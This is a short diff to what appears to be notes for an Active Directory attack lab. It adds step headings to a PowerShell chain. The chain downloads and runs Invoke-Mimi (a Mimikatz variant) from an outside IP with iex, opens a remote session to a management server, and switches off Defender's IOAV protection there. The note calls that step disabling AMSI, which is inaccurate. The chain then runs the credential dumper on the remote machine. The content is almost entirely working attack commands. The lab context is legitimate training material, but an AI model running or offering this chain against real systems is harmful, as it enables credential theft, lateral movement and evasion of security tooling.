@@ -219,12 +219,15 @@ Download Invoke-Mimi
 ```powershell
 iex (iwr http://172.16.100.115/Invoke-Mimi.ps1 -UseBasicParsing)
 ```
+Create a session with pssession
 ```powershell
  $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 ```
+Disable AMSI on the remote machine
 ```powershell
 Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
 ```
+Run invoke-mimi
 ```powershell
 Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 ```
